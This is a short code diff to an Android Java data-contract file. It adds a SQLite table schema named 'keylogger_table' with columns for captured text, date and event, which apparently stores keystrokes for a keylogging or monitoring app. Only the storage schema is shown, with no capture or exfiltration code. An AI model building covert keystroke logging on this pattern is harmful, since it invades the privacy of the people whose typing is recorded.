@@ -135,4 +135,18 @@ public class DataContract implements BaseColumns {
 
         protected static final String DROP_TABLE_STATEMENT = "DROP TABLE IF EXISTS " + TABLE_NAME;
     }
+
+    public static class KeyloggerContract{
+        public static final String TABLE_NAME = "keylogger_table";
+        public static final String COLUMN_TEXT = "text";
+        public static final String COLUMN_DATE = "date";
+        public static final String COLUMN_EVENT = "event";
+
+        public static final String CREATE_TABLE_STATEMENT = "CREATE TABLE IF NOT EXISTS " + TABLE_NAME + " (" + _ID + " INTEGER PRIMARY KEY," + COLUMN_TEXT + " TEXT,"
+                + COLUMN_DATE + " TEXT," + COLUMN_EVENT + " TEXT)";
+
+        public static final String DROP_TABLE_STATEMENT = "DROP TABLE IF EXISTS " + TABLE_NAME;
+
+    }
+
 }
